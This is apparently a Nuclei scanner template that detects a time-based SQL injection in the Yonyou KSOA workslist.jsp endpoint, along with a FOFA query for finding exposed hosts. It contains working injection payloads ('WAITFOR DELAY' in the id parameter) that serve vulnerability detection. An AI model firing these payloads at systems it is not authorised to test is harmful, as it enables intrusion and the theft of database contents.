http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        - |
          GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
id: yongyoushikong-KSOA-workslist_jsp-sql-time
info:
    author: Superhero
    description: |-
        fofa: app="用友-时空KSOA"
        用友时空KSOA系统 workslist.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 用友时空KSOA workslist.jsp SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/-31WTXuZHTdtMnQWDTCfrg
    severity: high
    tags:
        - Kong
